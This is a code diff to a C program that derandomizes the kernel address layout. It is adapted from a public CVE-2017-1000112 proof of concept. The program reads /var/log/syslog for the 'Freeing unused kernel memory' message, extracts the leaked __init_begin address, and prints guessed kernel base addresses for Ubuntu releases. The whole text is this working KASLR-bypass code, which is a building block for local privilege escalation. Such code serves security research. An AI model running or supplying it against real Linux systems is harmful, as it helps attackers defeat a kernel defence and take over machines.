@@ -10,8 +10,8 @@
 // -rw-r----- 1 syslog adm 1916625 Dec 31 04:24 /var/log/kern.log
 // -rw-r----- 1 syslog adm 1115029 Dec 31 04:24 /var/log/syslog
 //
-// free_reserved_area() leak was patched in 2016:
-// https://lore.kernel.org/patchwork/patch/728905/
+// free_reserved_area() leak was removed in kernel v4.10-rc1 on 2016-10-26:
+// https://github.com/torvalds/linux/commit/adb1fe9ae2ee6ef6bc10f3d5a588020e7664dfa7
 //
 // Mostly taken from original code by xairy:
 // https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c
@@ -23,29 +23,15 @@
 #include <stdlib.h>
 #include <string.h>
 #include <sys/mman.h>
-#include <sys/utsname.h>
 #include <unistd.h>
-
-// https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt
-unsigned long KERNEL_BASE_MIN = 0xffffffff80000000ul;
-unsigned long KERNEL_BASE_MAX = 0xffffffffff000000ul;
-
-struct utsname get_kernel_version() {
-  struct utsname u;
-  if (uname(&u) != 0) {
-    printf("[-] uname(): %m\n");
-    exit(1);
-  }
-  return u;
-}
-
-#define CHUNK_SIZE 1024
+#include "kasld.h"
 
 unsigned long get_kernel_addr_free_reserved_area_syslog() {
   FILE *f;
   char *path = "/var/log/syslog";
+  const int addr_len = sizeof(long*) * 2;
   unsigned long addr = 0;
-  char buff[CHUNK_SIZE];
+  char buff[BUFSIZ];
 
   printf("[.] checking %s for free_reserved_area() info ...\n", path);
 
@@ -55,64 +41,48 @@ unsigned long get_kernel_addr_free_reserved_area_syslog() {
     return 0;
   }
 
-  while ((fgets(buff, CHUNK_SIZE, f)) != NULL) {
-    const char *needle1 = "Freeing unused";
+  while ((fgets(buff, BUFSIZ, f)) != NULL) {
+    const char *needle1 = "Freeing unused kernel memory";
     char *substr =
-        (char *)memmem(&buff[0], CHUNK_SIZE, needle1, strlen(needle1));
+        (char *)memmem(&buff[0], BUFSIZ, needle1, strlen(needle1));
 
     if (substr == NULL)
       continue;
 
-    int start = 0;
-    int end = 0;
-    for (start = 0; substr[start] != '-'; start++)
-      ;
-    for (end = start; substr[end] != '\n'; end++)
-      ;
+    char *line_buf = strtok(substr, "\n");
+    if (line_buf == NULL)
+      return 0;
 
-    const char *needle2 = "ffffff";
-    substr =
-        (char *)memmem(&substr[start], end - start, needle2, strlen(needle2));
+    char *addr_buf = strstr(line_buf, "(");
+    if (addr_buf == NULL)
+      return 0;
 
-    if (substr == NULL)
-      continue;
+    char *endptr = &addr_buf[addr_len];
+    addr = strtoul(&addr_buf[1], &endptr, 16);
 
-    char *endptr = &substr[16];
-    addr = strtoul(&substr[0], &endptr, 16);
-    break;
+    if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX)
+      break;
+
+    addr = 0;
   }
 
   fclose(f);
 
-  if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX)
-    return addr;
-
-  return 0;
+  return addr;
 }
 
 int main(int argc, char **argv) {
-  unsigned long addr = 0;
-
-  struct utsname u = get_kernel_version();
-
-  /* this technique should also work on 32-bit. lazy */
-  if (strstr(u.machine, "64") == NULL) {
-    printf("[-] unsupported: system is not 64-bit.\n");
-    exit(1);
-  }
-
-  addr = get_kernel_addr_free_reserved_area_syslog();
+  unsigned long addr = get_kernel_addr_free_reserved_area_syslog();
   if (!addr)
     return 1;
 
-  printf("leaked address: %lx\n", addr);
+  printf("leaked __init_begin: %lx\n", addr);
 
-  /* ubuntu trusty */
-  printf("kernel base (likely): %lx\n", addr & 0xffffffffff000000ul);
-
-  /* ubuntu xenial */
-  printf("kernel base (likely): %lx\n",
+#if defined(__x86_64__) || defined(__amd64__)
+  printf("kernel base (ubuntu trusty): %lx\n", addr & 0xffffffffff000000ul);
+  printf("kernel base (ubuntu xenial): %lx\n",
          (addr & 0xfffffffffff00000ul) - 0x1000000ul);
+#endif
 
   return 0;
 }
